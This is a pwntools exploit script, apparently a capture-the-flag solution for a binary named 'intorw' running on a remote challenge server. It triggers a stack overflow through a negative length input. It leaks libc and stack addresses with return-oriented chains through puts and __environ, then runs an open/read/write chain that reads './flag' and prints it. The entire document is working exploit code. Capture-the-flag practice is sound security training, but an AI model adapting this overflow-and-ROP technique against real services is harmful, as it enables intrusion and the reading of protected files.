from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node2.anna.nssctf.cn",28492)
# io=process("./intorw")
elf=ELF("./intorw")
libc=ELF("./libc.so.6")

pop_rdi=next(elf.search(asm("pop rdi;ret")))
ret=0x400726

def pre():
    io.sendlineafter(b"read\n",b"-1")
    io.recvuntil(b"read:\n")


pre()
payload=cyclic(0x28)+p64(pop_rdi)+p64(elf.got[b"puts"])+p64(elf.plt[b"puts"])+p64(0x4009c4)
io.send(payload)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-libc.sym[b"puts"]
print("leak_addr: "+hex(leak_addr))

open_a=leak_addr+libc.sym[b"open"]
read_a=leak_addr+libc.sym[b"read"]
write_a=leak_addr+libc.sym[b"write"]
environ=leak_addr+libc.sym[b"__environ"]
pop_rsi=leak_addr+0x2be51 
pop_rdx_r12=leak_addr+0x11f497
pop_rax=leak_addr+0x45eb0
syscall_ret=leak_addr+0x091396

# gdb.attach(io)
# pause()

pre()
payload=cyclic(0x28)+p64(pop_rdi)+p64(environ)+p64(elf.plt[b"puts"])+p64(0x4009c4)
io.send(payload)
stack_addr=u64(io.recvuntil(b"\x7f").ljust(8,b"\x00"))
print("stack_addr: "+hex(stack_addr))

# gdb.attach(io)
# pause()

#open
orw=p64(pop_rdi)+p64(stack_addr-0x48)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x601300)+p64(pop_rdx_r12)+p64(0x50)+p64(0)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(0x601300)+p64(pop_rdx_r12)+p64(0x50)+p64(0)+p64(write_a)


pre()

payload=cyclic(0x28)+orw+b"./flag\x00\x00"
io.send(payload)



io.interactive()